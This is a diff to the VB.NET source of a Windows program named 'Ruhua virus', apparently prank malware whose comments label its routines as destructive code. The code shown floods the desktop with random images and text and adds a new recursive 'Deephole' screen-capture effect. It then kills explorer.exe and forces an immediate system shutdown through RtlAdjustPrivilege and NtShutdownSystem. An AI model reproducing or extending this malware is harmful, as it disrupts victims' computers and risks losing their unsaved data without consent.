@@ -1,7 +1,6 @@
 ﻿Imports System.Windows.Forms
 Imports System.Drawing
 Imports System.IO
-Imports System.Media.SoundPlayer
 Imports System.Reflection
 Imports System.Collections.Generic
 Imports 如花病毒.Form2.SoundW
@@ -21,6 +20,7 @@ Public Class Form2
     'Public Declare Function PlaySound Lib "winmm.dll" （ByVal lpszSoundName As String， ByVal hModule As Integer， ByVal dwFlags As Integer） As Integer
     Const IsDebug As Boolean = False 'True为不执行破坏代码，FALSE为执行
     Private a As Long
+    Private z As Long
     Enum SoundW
         Do0 = 264
         Re = 297
@@ -117,6 +117,8 @@ debugTag:'以上都是破坏代码
         newthread2.Start()
         Dim newthread4 As New Threading.Thread(AddressOf Icoc)
         newthread4.Start()
+        Dim newthread6 As New Threading.Thread(AddressOf Deephole)
+        newthread6.Start()
         Threading.Thread.Sleep(1000 * 60)
         Dim newthread5 As New Threading.Thread(AddressOf CrazyString)
         newthread5.Start()
@@ -124,13 +126,17 @@ debugTag:'以上都是破坏代码
         'newthread3.Start()
         Threading.Thread.Sleep(1000 * 60 * 4)
         Shell("taskkill /im explorer.exe /f", 0)
-        Threading.Thread.Sleep(1000 * 60)
+        Threading.Thread.Sleep(1000 * 60 * 3)
         RtlAdjustPrivilege(&H13, &H1, &H0, &H0)
         NtShutdownSystem(&H0)
     End Sub
 
     Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
         Dim form As New Form1
+        z = z + 1
+        If z = 10 Then
+            Exit Sub
+        End If
         form.Show()
     End Sub
 
@@ -173,7 +179,7 @@ again:
         a += 1
         If a = 120 Then
             Timer3.Start()
-        ElseIf a = 240 Then
+        ElseIf a = 300 Then
             Timer1.Start()
         End If
     End Sub
@@ -229,7 +235,9 @@ again:
         Dim imagelist As New List(Of Image) From {My.Resources.Resource1.a.ToBitmap, b.ToBitmap, c.ToBitmap, d.ToBitmap, e.ToBitmap, f.ToBitmap, g.ToBitmap}
         Dim screen As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()))
         Threading.Thread.Sleep(1000 * 40)
-        Do
+        Dim exits As Long = 100
+        Do Until exits = 0
+            exits = exits - 1
             screen.DrawImage(imagelist.Item(Random.Next(0, imagelist.Count - 1)), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
             Threading.Thread.Sleep(1000)
         Loop
@@ -237,7 +245,9 @@ again:
     Sub CrazyString()
         Threading.Thread.Sleep(1000 * 20)
         Dim screen As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()))
-        Do
+        Dim z As Long = 1800
+        Do Until z = 0
+            z = z - 1
             Dim msg As String = list.Item(Random.Next(list.Count - 1)）
             Dim color As Brush = list2.Item(Random.Next(list2.Count - 1))
             Dim fontsyle As FontStyle = list3.Item(Random.Next(list3.Count - 1))
@@ -245,6 +255,43 @@ again:
             Dim rect As Rectangle = Windows.Forms.Screen.PrimaryScreen.WorkingArea '获得屏幕大小
             Dim font As Font = New Font(SystemFonts.MessageBoxFont.FontFamily, Random.Next(1, 25), fontsyle) '设置字体大小取随机值
             screen.DrawString(msg, font, color, New PointF(Random.Next(rect.Width), Random.Next(rect.Height)))
+        Loop
+    End Sub
+    Sub Deephole()
+        Threading.Thread.Sleep(1000 * 60 * 5)
+Main:
+        Dim slp As Double = 1000 '决定休眠时间。
+        Dim temp1 As Windows.Forms.Screen = Screen.PrimaryScreen
+        Dim a As New Bitmap(temp1.WorkingArea.Size.Width, temp1.WorkingArea.Size.Height)
+        Dim aaa As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()))
+        Dim aaab As Graphics = Graphics.FromImage(a)
+        Dim sa As New Point(0, 0)
+        Do
+            Try
+                slp -= 10
+                If slp <= 0 Then
+                    slp = 1
+                End If
+                aaab.CopyFromScreen(New Point, New Point, temp1.WorkingArea.Size)
+                Dim Hicon As IntPtr = a.GetHicon()
+                aaa.DrawIcon(Icon.FromHandle(Hicon), New Rectangle With {
+                    .Width = temp1.WorkingArea.Width * 0.9,
+                    .Height = temp1.WorkingArea.Height * 0.9,
+                    .X = temp1.WorkingArea.Width * 0.05,
+                    .Y = temp1.WorkingArea.Height * 0.05
+                             })
+                Threading.Thread.Sleep(slp)
+                aaab.Dispose()
+                a.Dispose()
+                a = New Bitmap(temp1.WorkingArea.Size.Width, temp1.WorkingArea.Size.Height)
+                aaab = Graphics.FromImage(a)
+            Catch
+                aaa.Dispose()
+                aaab.Dispose()
+                a.Dispose()
+                Threading.Thread.Sleep(10000)
+                GoTo Main
+            End Try
         Loop
     End Sub
 End Class
